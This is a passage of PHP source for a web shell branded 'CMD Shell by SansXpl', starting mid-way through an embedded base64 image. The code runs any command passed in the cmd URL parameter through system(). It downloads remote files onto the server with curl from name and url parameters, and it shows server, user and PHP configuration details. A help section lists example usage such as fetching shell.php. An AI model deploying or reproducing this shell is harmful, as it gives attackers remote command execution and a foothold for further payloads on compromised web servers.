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";

	$start = strpos($info, "<a name=System></a>") + strlen("<a name=System></a>");
	$end = strpos($info, "<a name=\"Configure", $start);
	$sectionInfo = substr($info, $start, $end - $start);

	foreach ($sections_to_hide as $section) {
		$sectionInfo = str_replace($section, '', $sectionInfo);
	}
	foreach ($url_to_replace as $section1) {
		$sectionInfo = str_replace($section1, 'https://github.com/SANSDESU', $sectionInfo);
	}
	foreach ($img_to_replace as $section2) {
		$sectionInfo = str_replace($section2, $SansXplImg, $sectionInfo);
	}

	$sectionInfo = str_replace('This program makes use of the Zend Scripting Language Engine:', 'CMD Shell by SansXpl<br>github: github.com/SANSDESU', $sectionInfo);
	$sectionInfo = str_replace('Zend&nbsp;Engine&nbsp;v4.2.4,&nbsp;Copyright&nbsp;(c)&nbsp;Zend&nbsp;Technologies', '', $sectionInfo);

	$sectionInfo = str_replace('<div class="center">', '<div class="center2">', $sectionInfo);

	$sectionInfo = '
	<div style=" height:500px; overflow-x:auto;">'.$sectionInfo.'</div>';
	return $sectionInfo;
}

?>

<link href="data:image/png;base64,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" rel="icon" type="image/x-icon" />
<?php
echo $style;
echo $guiscript;
?>




<div class="center font">
<pre style="font-size:large;">
<?php
echo $banner;

		if (isset($_GET['gui'])) {
			echo $guibtn;
		}
		if (isset($_GET['gui']) && isset($_GET['cmd'])) {
			echo $guicmd;
		}
		if (isset($_GET['gui']) && isset($_GET['curl'])) {
			echo $guicurl;
		}
		else if (isset($_GET['name']) && isset($_GET['url'])) {
			echo '<title>SansXpl - Curl Download</title>';
			set_time_limit(0);
			$fp = fopen ($_GET['name'], 'w+');
			$url = $_GET['url'];
			$ch = curl_init(str_replace(" ","%20",$url));
			curl_setopt($ch, CURLOPT_TIMEOUT, 50);
			curl_setopt($ch, CURLOPT_FILE, $fp);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
			$data = curl_exec($ch);
			curl_close($ch);

			$filesize = filesize($_GET['name']); // Get file size in bytes
			$base_url = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
			$base_url .= "://".$_SERVER['HTTP_HOST'].dirname($_SERVER['REQUEST_URI']);
			$parsed_url = parse_url($base_url);
			$base_url = $parsed_url['scheme'] . "://" . $parsed_url['host'] . dirname($parsed_url['path']);

			echo '<center><b>---------------[ CURL DOWNLOAD ]---------------</b></center>';
			echo '<br>Status    : '.($data ? 'DONE!' : 'FAILED!');
			echo '<br>Name File : '.$_GET['name'];
			echo '<br>File URL  : '.$_GET['url'];
			echo '<br>File Size : '.formatBytes($filesize); // Display file size in a human-readable format
			echo '<br>File Loc  : <a target="_blank" href="'.$base_url.'/'.$_GET['name'].'">'.$base_url.'/'.$_GET['name'].'</a>';
			echo '<br><center><b>----------------------------------------------</b></center>';

		} else if(isset($_GET['cmd'])) {
			$command = $_GET['cmd'];
			if ($_GET['cmd'] == ''){
				$command = 'echo "CMD Shell by SansXpl"';
			}
			echo '<title>SansXpl - Command Shell</title>';
			echo "<center><b>-----------------[ CMD OUTPUT ]-----------------</b></center><br>";
			echo '<div style=" height:400px; overflow-x:auto;">';
			system($command);
			echo '</div>';
			echo "<center><b>------------------------------------------------</b></center>";

		} else if(isset($_GET['server'])) {
			echo '<title>SansXpl - Server Info</title>';
			echo "<center><b>------------------[ SERVER INFO ]------------------</b></center>";
			echo '<br>Uname     : '.php_uname();
			echo '<br>PHP Ver   : '.PHP_VERSION;
			echo '<br>Server IP : '.gethostbyname($_SERVER['HTTP_HOST']);
			echo '<br>Client IP : '.getUserIpAddr();
			echo '<br>User Info : '.@get_current_user().' ('.@getmyuid().') | Group: ? ('.@getmygid().')';
			echo "<br><center><b>-----------------------------------------------</b></center>";

		} else if(isset($_GET['phpinfo'])) {
			echo '<title>SansXpl - PHP Info</title>';
			echo "<center><b>------------------[ PHP INFO ]------------------</b></center>";
			echo getPhpInfo();

		} else if(isset($_GET['help'])) {
			echo '<title>SansXpl - Help Command</title>';
			echo '<center><b>----------------[ COMMAND LIST ]----------------</b></center>

<b>For Help Input:</b> help or cmd=help

<b>Usage:</b>
   ?cmd=uname+-a
   ?name=shell.php
   ?url=http://localhost/shell.php

<b>Multi Param:</b>
   ?login&gui
   ?login&gui&name=file.txt&url=(url)/file.txt

<b>Command Param:</b>
   <b>?cmd=</b>      execute command shell
   <b>?name=</b>     set curl filename
   <b>?url=</b>      set curl file url

   <b>?gui</b>       GUI mode
   <b>?server</b>    Show Server Info
   <b>?phpinfo</b>   Show PHP Info

   <b>?login</b>     login into shell
   <b>?logout</b>    clear login data

<center><b>------------------------------------------------</b></center>
			';
		}

if(isset($_GET['logout'])) {

	if(isset($_GET['logout'])) {
		if(isset($_SERVER['PHP_AUTH_USER'])) {
			unset($_SERVER['PHP_AUTH_USER']);
			$_SERVER['PHP_AUTH_USER'] = null;
			var_dump('PHP_AUTH_USER unset');
		}

		if(isset($_SERVER['PHP_AUTH_PW'])) {
			unset($_SERVER['PHP_AUTH_PW']);
			$_SERVER['PHP_AUTH_PW'] = null;
			var_dump('PHP_AUTH_PW unset');
		}
	}

}
?>
</pre>
</div>


